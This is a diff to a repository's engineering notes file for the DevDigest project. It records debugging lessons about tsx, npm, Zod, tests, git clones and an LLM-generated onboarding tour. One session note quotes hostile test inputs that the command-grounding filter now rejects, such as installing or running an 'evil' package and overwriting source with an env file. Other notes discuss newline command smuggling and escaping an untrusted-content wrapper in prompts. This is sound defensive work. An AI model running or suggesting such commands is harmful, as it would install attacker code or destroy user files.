+  the script's own directory, not from the CWD, so it dies with `ERR_MODULE_NOT_FOUND` even
+  though `pnpm exec tsx` was run from `server/`. Reach the data through a repository method
+  instead of writing a query in the script.
+
+### `new SimpleGitClient('./clones')` from `server/` drives a clone-reading executor for real
+
+The git twin of the `startPg()` entry above, and the same two mechanics apply (`.mts`, server
+imports only). `server/clones/` already holds this repository cloned as `Holubinka/dev-digest`, so
+an executor that only reads a clone can be run against a real one with no API, no DB and no route:
+construct `new SimpleGitClient('./clones')`, stub the facade, pass
+`{ id, owner: 'Holubinka', name: 'dev-digest', fullName }`. Used 2026-08-17 to exercise
+`OnboardingGatherExecutor` end to end — five manifests, `pnpm` for `client`/`server` and `npm` for
+`e2e`/`mcp`/`reviewer-core`, `docker-compose.yml` read whole, both `.env.example` files found.
+
+Two things that run is **not** evidence of, both checked rather than assumed:
+
+- **The exclusion list.** That clone has no `node_modules/` and no `client/.next/`, so nothing was
+  there to exclude. `EXCLUDED_WALK_DIRS` is still only provable over a temp clone built to contain
+  them.
+- **A root package block.** DevDigest declares no workspace and has no root `package.json`, so a
+  scan of it finds **five** packages and never exercises the root-first rule (AC-94). A plan or a
+  verification step expecting six on this repository is counting a package that does not exist.
+
+### npm's bare script form works for exactly four scripts; pnpm, yarn and bun take any
+
+**Symptom.** A generated `npm dev` beside a copy control errors on paste, while the identical
+`pnpm dev` works and the equally bare `npm test` works too. All three passed the same
+"manager plus script name" check.
+
+**Cause.** npm has no GENERAL bare form — `npm run <script>` is it — but `test`, `start`, `stop`
+and `restart` are built-in npm commands that run the like-named script. Measured on npm 10.9.8,
+2026-08-18, against one manifest declaring all six scripts:
+
+```
+npm test → RAN_TEST   npm stop    → RAN_STOP      npm dev   → Unknown command: "dev"
+npm start → RAN_START  npm restart → RAN_RESTART   npm build → Unknown command: "build"
+```
+
+That mixture is the trap. Try the bare form on `test` and npm looks like pnpm; try it on `dev`
+and it does not. pnpm, yarn and bun accept the bare form for every script.
+
+**Fix.** Where code emits a script command per package manager, gate the bare form for npm on
+the four-name set and require `run` for everything else — `NPM_BARE_COMMANDS` and `runsScript` in
+`modules/onboarding/helpers.ts`. Both over- and under-strict versions cost something real, which
+is why neither end is the safe default: requiring `run` always drops `npm test`, one of the first
+commands a newcomer types and one that is not broken; requiring it never emits `npm dev`, which
+errors on paste. Do not extend the set from memory — re-measure, as the numbers above were.
+
+### A literal `.default([])` does not leak between parses — but only because `ZodArray` rebuilds
+
+Zod 3 wraps a non-function default as `() => value`, so every parse of a missing key is handed
+THE SAME object. Whether that object reaches the caller depends on the schema underneath it, and
+the answer is not uniform. Measured on zod 3.25.76 (2026-08-18, `node --input-type=module`):
+
+```
+z.array(z.string()).default([])   → parse({}).a === parse({}).a   false
+z.object({ n: z.number() }).default({ n: 0 })                     false
+z.unknown().default([])           → parse({}).raw === parse({}).raw  true
+```
+
+`ZodArray._parse` and `ZodObject._parse` construct a new container from the parsed members, so
+the default is data going in and never the value coming out; `z.unknown()` passes its input
+through untouched, and every parse then shares one array that any caller can `push` into.
+
+So the literal form used across `vendor/shared` — `contracts/trace.ts:168`,
+`contracts/eval-ci.ts:97`, and every count and array in the onboarding block of
+`contracts/knowledge.ts` — is safe and needs no `() => []` factory. Reach for the factory when
+the schema does not rebuild: `z.unknown()`, `z.any()`, `z.custom()`, or anything ending in a
+`.transform()` that returns its argument. Re-measure rather than reasoning it out; the three
+results above are one line each.
+
+### A scratch script that exercises server code against a real clone must be `.mts`, not `.ts`
+
+`pnpm exec tsx /tmp/…/exercise.ts` fails with `Top-level await is currently not supported with the
+"cjs" output format`, even though `server/package.json` declares `"type": "module"`. The manifest
+that decides the format is the nearest one to the SCRIPT, not to the cwd — and a file in a
+scratchpad directory outside the repository has none, so esbuild defaults to CJS. Renaming to
+`.mts` fixes it outright; `tsx` still picks up `server/tsconfig.json` from the cwd, so the
+`@devdigest/shared` path alias keeps resolving and imports written as `…/helpers.js` still land on
+the `.ts` source. Measured 2026-08-18, tsx bundled with `server/`, Node 22.23.1.
+
+Worth knowing because this is the cheapest way to exercise a pure module against
+`server/clones/<owner>/<repo>` through the real port — no Postgres, no model call, no test file
+added to the suite for something that is a one-off check.
+
+
+
+### `pnpm typecheck` does not read `server/test/`, so a test's type errors are invisible to every gate
+
+**Symptom.** `test/repo-intel-critical-paths.test.ts` declared `make: (i: number) => string` and
+called it with `String(i).padStart(2, '0')`. Nine tests were green, `pnpm typecheck` was clean, and
+the branch passed every gate.
+**Cause.** `server/tsconfig.json` does not include `test/`, and vitest does not typecheck. Nothing
+in Track A reads that file as TypeScript.
+**Fix.** Until the tsconfig covers `test/`, an editor diagnostic is the only thing that sees it.
+This cuts against the (correct) local rule that editor diagnostics lie here — they do not resolve
+tsconfig `paths` and routinely invent `Cannot find module '@devdigest/shared'` where
+`pnpm typecheck` is clean. Both are true at once: **distrust a diagnostic that names a module
+resolution problem; read one that names a type mismatch inside a test file**, because no gate will
+tell you.
+
 ## Recurring Errors & Fixes
 
 ### A review run fails with `401 Missing Authentication header`
@@ -804,6 +1975,39 @@ Do not "sync" the two lists on sight. `tsconfig.json:21-26` carries four mapping
 `/*` wildcards against two bare aliases in `vitest.config.ts:6-9`, and nothing imports a
 subpath today — every `@devdigest/…` specifier in `src/` and `test/` is bare. That
 asymmetry is inert, not a bug.
+
+### Correction (2026-08-18) — the same gap bites FIXTURE VALUES, not just imports
+
+**Symptom.** `pnpm typecheck` clean, `pnpm arch` clean, 1130 unit tests green — and
+`test/onboarding.it.test.ts` failed three cases inside a testcontainers run with `tour: null`
+where a saved tour was expected. Nothing in the source was wrong.
+
+**Cause.** The fixture said `kind: 'what_it_does'`, which is not a member of
+`OnboardingSectionKind` (`contracts/knowledge.ts` has `architecture | critical_paths |
+how_to_run | reading_path | first_tasks`). The record was written to jsonb unvalidated and then
+failed `OnboardingRecord.safeParse` on the way back out, which the repository correctly degrades
+to "no tour yet". The 2026-07-27 correction above explains why `tsc` said nothing — `test/` is
+outside the compilation — but it frames the consequence as unresolved IMPORTS. The larger cost is
+that **every type annotation in every test file is decorative**: a `const DRAFT: OnboardingDraft`
+whose literal violates the type is accepted, and the failure surfaces minutes later behind Docker.
+
+**Fix.** Typecheck the tests explicitly before running a new `*.it.test.ts`, with a throwaway
+config so nothing is added to the repo:
+
+```sh
+cd server && cat > tsconfig.tests.tmp.json <<'JSON'
+{ "extends": "./tsconfig.json",
+  "compilerOptions": { "noEmit": true },
+  "include": ["src/**/*.ts", "test/**/*.ts"] }
+JSON
+npx tsc --noEmit -p tsconfig.tests.tmp.json; rm -f tsconfig.tests.tmp.json
+```
+
+Run on 2026-08-18 it found two more defects the suite would have hit at runtime — a
+`noUncheckedIndexedAccess` destructure of a `count(*)` row, and `req.headers` on the `{}`-typed
+request of a hand-rolled `AuthProvider` (the same line exists unfixed in
+`test/brief-rate-limit.it.test.ts`). It also reports pre-existing errors in other test files, so
+grep the output for the files you touched.
 
 ### An integration test that starts a review makes LIVE OpenRouter calls unless `secrets` is overridden
 
@@ -956,6 +2160,125 @@ and read a 404 from a trace fetch as "the run did not finish", never as a routin
 defect. The durable fix is in `waitForPrRuns`: a helper that gives up should throw, so the failure
 names itself. Until it does, a green serial run and a red parallel one is not two results — it is
 one result and one timeout.
+
+### A `withTimeout` mutation test hangs the whole vitest run instead of failing it
+
+**Symptom.** Removing `withTimeout(...)` from `modules/brief/service.ts` to prove the R43 test can
+fail made `pnpm exec vitest run test/brief-service.test.ts` run past a two-minute tool timeout with
+no output.
+**Cause.** The test's fake provider returns `new Promise(() => {})`. With the outer clock gone
+nothing ever settles, and the file's `testTimeout` is 120 000 ms from `vitest.config.ts` — longer
+than the shell was willing to wait.
+**Fix.** Mutation-test a timeout with `--testTimeout=5000` on the command line. The run then
+reports `Test timed out in 5000ms` against the one case, which is the evidence wanted, in seconds
+instead of minutes.
+
+### A bisect that lands on `platform/container.ts` needs the module set checked before it is believed
+
+**Symptom.** `test/reviews-diff.it.test.ts` reported `Error: Hook timed out in 120000ms`, all 8
+tests skipped, the file running 903 s (2026-08-16, fix round 4 of plan 10). A one-run-per-state
+bisect blamed `platform/container.ts` — the `briefService` getter and its new imports — because
+restoring only that file made the run pass in 4.58 s.
+
+**Cause.** That edit cannot reach `startPg()`. The getter is lazy and no test in that file calls
+it, and `modules/brief/routes.ts` **lost** `import { BriefService }` / `import { BriefRepository }`
+in the same change that `platform/container.ts` gained them — so the set of modules the app loads
+is unchanged. Proved by walking the static value-import graph from `src/app.ts` over both trees:
+138 modules, 0 cycles, identical file lists. The real cause is the load the entry two above
+describes — `startPg()` waiting on a `pgvector/pgvector:pg16` container the daemon did not deliver
+inside 120 s. Vitest reports a suite whose `beforeAll` failed as **skipped**, so a skip here means
+"the hook never came up", not "the condition was false".
+
+**Fix.** Two checks, both cheaper than the bisect. First, count the skips against the file: a suite
+whose hook died contributes all of its tests, so a full run reading `158 passed | 4 skipped`
+accuses a 4-test file (`reviews-skills`, `agents-skill-count`, `pulls-comments`), never an 8-test
+one — that arithmetic alone contradicted the single-file evidence. Second, diff the module set
+instead of re-running: copy `src/` to a scratch dir, restore the suspect files with
+`git show HEAD:server/src/<path>`, and walk both graphs from `app.ts`. Moving a `new X()` from a
+route into a memoised container getter adds no module and no cycle; when the two lists match, the
+file is not the cause. Verified 2026-08-16 with round 4 fully in place: 3x
+`pnpm exec vitest run .it.test --fileParallelism=false` → 20 files / 162 tests / 0 skips, and 5x
+the single file at ~4.5 s.
+
+### Seeing the type errors in `test/` at all — one throwaway tsconfig
+
+**Symptom.** A fixture that has gone stale — a required field added to a contract or to a `*Values`
+interface, and the hand-written literal in `test/` never updated — is invisible to every gate.
+`pnpm typecheck` does not read `test/` (recorded above, 2026-07-27) and vitest checks runtime, so
+`test/brief-service.test.ts:99` sat on a TS2741 with a green board on 2026-08-16.
+
+**Cause.** `tsconfig.json` sets `"include": ["src/**/*.ts"]`, and no second config covers `test/`.
+
+**Fix.** From `server/`, one throwaway config and one run:
+
+```sh
+printf '{"extends":"./tsconfig.json","include":["src/**/*.ts","test/**/*.ts"]}' > tsconfig.tests.tmp.json
+pnpm exec tsc --noEmit -p tsconfig.tests.tmp.json; rm tsconfig.tests.tmp.json
+```
+
+Do this after widening any contract or any `*Values`/`*Row` interface. Expect pre-existing noise —
+on 2026-08-16 it reported 20 errors, of which 17 were long-standing (heterogeneous
+`new Map([[t.pullRequests, …], [t.prBrief, …]])` fixtures in `brief-routes.test.ts`, a loosely typed
+`req?.headers` in `brief-rate-limit.it.test.ts`, `defaultBranch` in `repo-intel-facade-degraded.test.ts`).
+Grep for the files you touched rather than reading the whole list, and do not "fix" the rest on sight:
+that is a separate pass, and making the run green is not the point of it.
+
+### `REVIEW_FIXTURE.score` is not the score that lands in the row
+
+**Symptom.** A new case in `test/reviews.it.test.ts` asserted a list payload's `score` against
+`REVIEW_FIXTURE.score` and failed with `expected 65 to be 42` (2026-08-17). The mock provider
+returned the fixture unchanged, and the review persisted fine.
+
+**Cause.** The fixture carries two findings, one of them on a line outside the diff. Grounding
+drops it and the run **rescores** what survived, so 42 goes in and 65 comes out. Every assertion
+in that file that reads a persisted score is reading a post-grounding number.
+
+**Fix.** Assert the property, not the literal: read the score once and compare later reads to it
+(`expect(afterPush.score).toBe(atHead.score)`), or assert `typeof … === 'number'`. Pinning 65
+would pin the grounding gate's arithmetic inside a test about something else — and a `.it.test`
+round trip costs ~80s, so the guess is expensive to make twice.
+### A job reported `done`, and the clone had not moved in 91 commits
+
+**Symptom.** `POST /repos/:id/refresh` answered `{"status":"refreshing"}` and its `clone` job
+finished `done` with an empty `error` column — while the clone's worktree stayed **91 commits**
+behind `origin/main`, and would have indefinitely. Project Context served `specs/` as it looked
+the day the repo was imported (ten files that moved to `plans/` on 2026-08-12 still listed,
+`SPEC-01-project-context.md` absent), and the repo-intel index parsed that same tree, so the blast
+radius was computed against code that no longer existed. Nothing reported a failure anywhere.
+Observed 2026-08-16.
+
+**Cause.** `GitClient.clone` short-circuits to a bare `fetch()` when `.git` already exists
+(`src/adapters/git/simple-git.ts:94-97`). A bare fetch advances `origin/<branch>` and touches
+neither `HEAD` nor the worktree — and the worktree is what every consumer reads. The method that
+advances one is `sync()` (`simple-git.ts:114-138`, fetch + `reset --hard origin/<branch>`), whose
+only caller sat behind a **different** route, `POST /repos/:id/resync`. Two routes a paragraph
+apart in the API map, and the one named "refresh" refreshed nothing a reader could see.
+
+**Fix.** The caller was fixed the same day — `RepoService.refresh` now enqueues `RESYNC_JOB_KIND`
+for an already-cloned repo and keeps the clone job for a repo that has none yet. The durable part
+is the diagnosis, because the next stale-clone symptom will not look like this one: **a job's
+`done` says nothing about a worktree.** Ask git.
+
+```sh
+CP=server/clones/<owner>/<repo>
+git -C "$CP" rev-list --left-right --count HEAD...origin/main   # "0 91" => fetched, never checked out
+ls -l "$CP/.git/FETCH_HEAD"                                     # seconds old => the network half worked
+```
+
+A fresh `FETCH_HEAD` beside a stale `HEAD` is the entire signature. Reach for it before suspecting
+the scanner, the indexer, or the parser — all three were innocent here.
+
+### `*/` inside a JSDoc backtick ends the comment, and esbuild blames the next template literal
+
+**Symptom.** `Transform failed: Expected ";" but found "apps"` from `vite:esbuild`, pointing at a
+line like ``tree[`apps/a${i}/package.json`] = '…'`` that is perfectly valid TypeScript.
+**Cause.** A `/** … */` docstring above it contained `` `examples/*/package.json` ``. The `*/`
+closed the comment early, the remaining prose became code, and the odd backtick left the parser
+inside a template literal — so the error surfaces at the NEXT backtick, several lines below the
+real fault. Hit twice on 2026-08-18 in `server/test/`.
+**Fix.** Never write a glob ending in `*/` inside a block comment; use `examples/<name>/…`. When
+esbuild reports a syntax error on a line that is obviously fine, look UP for an unbalanced
+backtick or an early `*/`, not at the line it names.
 
 ## Session Notes
 
@@ -1122,7 +2445,159 @@ one result and one timeout.
   a plain assignment would quietly turn a local-only document into one the page claims the
   repository carries. There is no delete to undo it with.
 
+### 2026-08-16 (PR why + risk brief, P2 of plan 10 — server)
+
+- `pr_brief` was reshaped rather than replaced: it had zero readers and zero writers since
+  `0000_init.sql`, so the `NOT NULL` columns needed no backfill anywhere the table exists.
+- Two helpers moved to `_shared/` for the same reason step 2 of the plan moved the budget walk:
+  `no-cross-module` follows `import type`. `selectWithinBudget`/`truncateToBudget` →
+  `_shared/budget.ts` with the failure status as a type parameter, and `parsePlanRefs` /
+  `sanitizeMarkdownRepoPath` → `_shared/plan-refs.ts` with the caps as parameters.
+  `modules/intent/helpers.ts` re-exports both bound to its own numbers, so
+  `test/intent-helpers.test.ts` passes unchanged — which is the proof the move was
+  behaviour-preserving. Copying the plan-ref parser instead would have been a third copy of a
+  traversal gate; sourcing the paths from `IntentRecord.plan_refs` instead would have made
+  `specs: included` unreachable whenever `intent: missing`, a quadrant the contract reports.
+- The brief prompt uses `*` bullets and never `-`. AC-17 ("no hunk, no patch body") is checkable
+  from the outside only as "no line of the assembled input looks like a diff line", and a markdown
+  `- ` bullet makes that assertion impossible to write.
+- Twenty-two mutations were run against the new suites before leaving them green; two did not
+  fail and both were real gaps, now closed: the service suite could not tell `fit.included` from
+  the raw blocks (no block was being dropped in its fixture), and the eviction guard had no case
+  where the new row was not the newest.
+- Proven live against `localhost:3001`: `POST /pulls/:id/brief` computed in 14 s
+  (`input_tokens_counted: 5463` of 8000, `tokens_in: 6364`, `attempts: 1`, one row), five GETs
+  afterwards left `computed_at` and `cost_usd` byte-identical, and an earlier POST returned
+  `502 Operation timed out after 45000ms` — the named 45 s clock of R43 firing against a real
+  provider, not a test double.
+
+### 2026-08-16 (risk brief — fix round 4)
+
+- Two majors from the third `/pr-self-review`, both in code the first three rounds had walked
+  past: the 8000-token budget was not a bound (`diff_stats` exempt from `DROP_ORDER` and
+  therefore unbounded), and the route was building the object graph for a service with instance
+  state. Both entries are under Codebase Patterns above.
+- **The grounding invariant was the trap, not the finding.** Round 3 turned
+  `[...buildAllowedRefs(fit.included)].filter(r => !fit.user.includes(r))` into
+  `test/brief-allowed-refs.test.ts`; the naive shape of the budget fix — shorten the text, leave
+  `refs` alone — breaks it, and the existing cases did NOT catch that, because none of them cut
+  the diff-stats list. The missing case was added ("holds when the budget shortens the diff-stats
+  path list") rather than assumed present. A fourth break of that invariant in four rounds.
+- Every new case was proved able to fail before being left green, by disabling the shrink loop
+  and by reverting the container getter to the old route-side semantics: 32685 vs 8000 with
+  `count = s => s.length`, `'included'` vs `'truncated'`, `404` vs `200`, and two distinct
+  `BriefService` objects where one was expected.
+- `pnpm typecheck` covers `src/**/*.ts` only, so the ~30 rewritten call sites in
+  `test/brief-service.test.ts` were checked by running them, not by `tsc` (already recorded under
+  Recurring Errors as "Correction (2026-07-27)").
+- Proven live again on the new code: `POST /pulls/:id/brief` for `Holubinka/dev-digest` PR #20,
+  HTTP 200 in 10.2 s, `input_tokens_counted: 5463` of 8000, `tokens_in: 5718`, `attempts: 1`,
+  `cost_usd: 0.0011`, `diff_stats: included (40 path(s) of 170)` — an ordinary PR is untouched by
+  the shrink, which is what a ceiling should look like.
+
+### 2026-08-17 (onboarding tour, plan 12 P5 — one call, and the object out of it)
+
+- **Proven live, and the live run is the only thing that found anything.** One
+  `OnboardingGenerateExecutor.run` against `Holubinka/dev-digest` through a real `Container`:
+  50 s, `openrouter` / `deepseek/deepseek-v4-flash`, `attempts: 1`, `input_tokens_counted: 23523`
+  of 24000, `tokens_in: 25856`, `cost_usd: 0.0027`, five sections `ready`, every one of the 18
+  link paths, 3 task paths, 3 flow steps and 3 reading-path items openable in the clone, all five
+  `dropped` counters zero, 20 probes. The 17 unit tests were green before that run and stayed
+  green after it, and they could not have told me what it told me — see the `getRepoMap` entry
+  under *What Doesn't Work*.
+- **This repository has no root `package.json`**, so `package_scan.found` is 5, not 6, and the
+  "root package is the first block" rule (AC-94) never fires here at all — it is covered by a
+  fixture in `test/onboarding-packages.test.ts` and by nothing else. Plan 12's `## Verification`
+  item 8 asks for 6; the number is wrong, not the code.
+- The model wrote three setup commands and all three survived grounding, including
+  `docker compose up -d postgres` — authorised by `docker-compose.yml` declaring that service.
+  `env_vars_truncated` came back `true` on the first real generation, exactly as the contract's
+  docstring predicted from `server/.env.example` declaring thirteen keys against a ceiling of 12.
+- Five negative controls were applied by hand to `generate-executor.ts` and each turned exactly
+  one case red: no probe cap, `attempts: 1` instead of the provider's, warning on the wrong
+  tokenizer id, a budget that forgets the user scaffold, and the walk's own cut instead of the
+  fence-aware one. The mutations are listed in the test file's docstring.
+
+### 2026-08-18 — onboarding fix round 1 (seven findings against `plans/12`)
+
+- Four findings were security defects the reviewer had already reproduced with a throwaway test.
+  Re-running the reviewer's own strings against the fixed code, rather than only asserting the
+  new behaviour, is what confirmed the fix addressed the reported input and not a paraphrase of
+  it: `pnpm install evil-pkg` → `install_command: null`, `pnpm dlx evil-cli dev` → dropped,
+  `cp .env.example server/src/index.ts` → dropped, both mockup lines kept verbatim.
+- Each new test was proved red before being left green, by reverting the predicate it covers:
+  five in `onboarding-grounding.test.ts` and five across `git-list-files.test.ts` /
+  `onboarding-gather.test.ts`. The depth-sort revert failed two PRE-EXISTING cases as well
+  ("counts depth from each root"), which is how the ordering change was shown to be observable
+  rather than incidental.
+- Changing the `listFiles` result shape touched no call site that destructures `{ files, bounded }`
+  — `modules/context/scan-executor.ts` compiled unchanged — but it did rewrite the expected
+  ORDER in three suites, `git-read-containment.test.ts` included. A port's sort order is part of
+  its contract in practice even where no docstring said so.
+- Allowing a trailing `#` comment on a command is safe here for a structural reason worth keeping:
+  nothing is stored as the model wrote it. Every surviving command is `tokens(cmd).join(' ')`, and
+  `tokens()` splits on `/\s+/`, so a newline — the one character that would turn the tail back
+  into a second instruction — cannot reach the rendered string.
+
+### 2026-08-18 (onboarding tour — HTTP, persistence, the index gate)
+
+- Built plan 13's `modules/onboarding` API half: the `onboarding-api.ts` contract in both
+  vendored copies, `types.ts` / `status.ts` / `repository.ts` / `service.ts` / `routes.ts`, two
+  container getters, the module registration and the README row. Six test files, 52 new cases.
+- **Exercised end to end against the running dev API, not only through fakes.** One real
+  generation on `Holubinka/dev-digest`: 200 in 122s, `deepseek/deepseek-v4-flash`, 23 377
+  provider tokens, `cost_usd` 0.00582, all five sections `ready`. The cached read after it is
+  7–13ms and byte-identical to the POST body — the p95 < 150ms NFR has ~10x of headroom. All
+  three refusals answered in 5–13ms with no model call. A generation that failed upstream
+  returned 502 after 111s and left `generated_at` unchanged, which is AC-51/AC-60 proved on real
+  rows rather than on a fake.
+- **The three mutations worth the two extra turns.** Removing the `lastIndexedSha === ''` guard,
+  renaming `index_state` to `packages` in the `.extend()`, and deleting the in-flight join each
+  turned exactly one assertion red. The contract collision was the one to check: it produces a
+  VALID Zod schema and no error in either package, so `onboarding-contract.test.ts` is the only
+  thing in the repository that can see it.
+- Full `.it.test` runs failed 1–4 cases in `test/reviews-context.it.test.ts`
+  (`GET /runs/:id` → 404 via `waitForPrRuns` returning on timeout). It passes 9/9 alone, and it
+  fails the same way with the two new onboarding files EXCLUDED — pre-existing load sensitivity,
+  not a regression. That file already carries `llmFallback` and `MockSecretsProvider({})`, so it
+  is not the live-OpenRouter cause recorded above.
+
+### 2026-08-18 (onboarding tour · depth, P3 — budget, clock, chains, task details)
+
+- **The real run answered the spec's own hypothesis.** `Holubinka/dev-digest`, 656 indexed files,
+  one `POST /repos/:id/onboarding/generate`: budget **32 528** (the formula's predicted number),
+  `chains_supplied` **20**, `longest_chain_files` **5**, `file_samples` **19 of 19**,
+  `project_docs` **7 of 7** with five shortened by `MAX_DOC_CHARS`, `input_tokens_counted`
+  **30 879** against the 32 528 ceiling, `duration_ms` **80 702** against a computed clock of
+  219 360, `cost_usd` **$0.0076** (**$0.0117** if scaled to the ceiling budget — the $0.02 bound
+  holds). The tour drew **14** flows where the old `MAX_FLOWS = 4` allowed four.
+- **Splitting the chains per block cost less than estimated.** Twenty per-chain blocks, each
+  repeating the `## Critical path chains` heading and its own fence, still left every one of the
+  nineteen samples shipping whole — the plan budgeted for losing one (AC-41 asks for ≥18 of 19).
+- **The model wrote commands into task steps and none was rejected**: `dropped.unknown_script`
+  was **0**, and every command in a step (`pnpm dev`, `pnpm test`, `pnpm typecheck`, `pnpm lint`,
+  `npm run build`, `npm test`, `npm run typecheck`) was verbatim one "How to run" had already
+  grounded. Grounding a step's command by MEMBERSHIP in that set — rather than by re-checking its
+  shape — is what makes the newest surface unable to weaken the four gates closed on 2026-08-18.
+- **What the run did NOT exercise: a step's `path`.** All three tasks came back with `path: null`
+  on every step, so the "a step whose path failed keeps its text and counts `unknown_path`" branch
+  is proved by `test/onboarding-grounding.test.ts` and by nothing that has run against a real
+  model yet. The same run left `dropped.unknown_path` at 10, up from 0 before this change, which
+  is what twenty chains' worth of extra claims looks like.
+- **Three tasks, not six.** `MAX_TASKS` is 6 and the model returned 3. The cap is not what bounds
+  this screen on this repository; the model's own judgement is.
+
+
 ## Open Questions
+
+- Onboarding Tour, 2026-08-18: moving `project_docs` above `file_samples` made the documents'
+  worst case dangerous where it used to be harmless. Before, an over-large document block was
+  dropped at the tail and cost nothing; now it is served first and eats the samples. This
+  repository has 5 packages → 7 documents → 7 077 tokens, 29 % of the budget. A monorepo at
+  `MAX_PACKAGES` offers 14 documents, roughly 14 000 tokens, 58 % of it — leaving 8-9 of the 20
+  samples. `MAX_DOC_CHARS` (4 000) bounds one document but nothing bounds the block. Whether
+  `project_docs` needs a block-level ceiling of its own, the way `REPO_MAP_TOKEN_BUDGET` bounds the
+  skeleton, is unanswered and wants a measurement on a real monorepo rather than a guess.
 
 - **A scan claim outliving its process is bounded by time, not by liveness.**
   `SCAN_CLAIM_STALE_MS` (10 min) is the only thing that releases `repo_doc_scans.scanning_at`
@@ -1233,3 +2708,47 @@ one result and one timeout.
   is disabled entirely under `NODE_ENV=test`, so `{ max: 30, timeWindow: '1 minute' }` on each write
   route is the same population for a local-first single-workspace install and is untestable by the
   integration suite. A workspace-keyed limiter was explicitly out of scope for plan 09.
+- **Two more allowed-refs holes are known and unfixed, both outside the round-3 brief.** (1) A
+  spec block's `refs` is its own path on the argument that the path leads the section and a
+  prefix cut keeps it — but `truncateToBudget` guarantees only ONE code point, so a spec cut to
+  less than its own `### <path>` header licenses a path the prompt never printed. Measured
+  2026-08-16: with one 4000-char spec at `plans/a-long-plan-name.md`, a budget of
+  `fixedBlocks + 71…98` reports `specs: truncated` and leaves that path allowed and unprinted;
+  at +70 the remainder goes non-positive and the spec is `dropped` instead, which is why the
+  window is narrow rather than absent. (2) `wrapUntrusted` rewrites
+  `</untrusted>` to `<\/untrusted>` inside the content, so a path or endpoint label containing
+  that literal is registered in one form and printed in another. Both were noticed on 2026-08-16
+  while fixing the third break of the invariant, and both are the same family: a caller declaring
+  a name printed without asking the rendered text. The enforcement test would catch either the
+  moment a fixture expresses it.
+  - **Half-answered 2026-08-16, round 5.** (2) is closed FOR SPECS and only for specs: the escape
+    now runs per spec file in `buildBlocks`, on the path and the body separately, so `refs[0]` is
+    the string the block prints whatever the path contains. It cannot arise there anyway —
+    `sanitizeMarkdownRepoPath`'s character class (`plan-refs.ts:51`) has no `<` or `>`. The BLAST
+    half is untouched and still open: `blastBlock` adds `part(symbol.file)` and
+    `part(endpoint.label)` to `refs` raw while `wrapUntrusted` escapes the printed line, and those
+    strings come from the indexer over repository content, which has no such character class.
+    (1) is untouched. Both were out of the round-5 brief.
+
+- **Does `MAX_ENV_VARS = 12` need to disclose its overflow the way `package_scan` does?**
+  `server/.env.example` in this repository declares 13 keys, so a project of exactly this shape
+  already loses one variable off the tail with nothing on the screen saying so. The package
+  ceiling has AC-90 and `package_scan.found - shown` for precisely this; the env list has no
+  equivalent and no criterion asking for one. Raised 2026-08-17 while sourcing the caps in
+  `modules/onboarding/constants.ts`; deliberately not decided there, because the number is the
+  spec's to move and the disclosure would be a new field in a contract two other slices read.
+  - **Answered 2026-08-17 by the coordinator, and the answer was not the number.** The ceiling
+    stays at 12; `Onboarding.env_vars_truncated` was added instead, in the shape
+    `sample_truncated` already had. Raising the cap would have moved the cliff to a repository
+    with 25 variables and kept the silence — the defect was never the number, it was that the
+    cut was invisible. Worth generalising when the next cap comes up for review: this feature
+    discloses a cut three ways (`package_scan.found`/`shown`, `sample_truncated`,
+    `env_vars_truncated`) and a fourth cap without disclosure is now the outlier, not the norm.
+
+- **The junk-path filter on chain roots is precautionary, not measured.** P2 of `plans/15` skips a
+  candidate root that `isJunkPath` rejects, on the reasoning that 20 chains reach much further down
+  the rank list than 5 roots did and would start seeding on tests and `.d.ts` files. On
+  `Holubinka/dev-digest` the filter fired **zero** times: 20 chains were collected from the first 46
+  rank candidates and none of them was junk (2026-08-18). The unit case in
+  `test/repo-intel-critical-paths.test.ts` pins the behaviour, but no real repository has yet shown
+  the filter changing an answer — a monorepo with a large test tree would be the one to check.
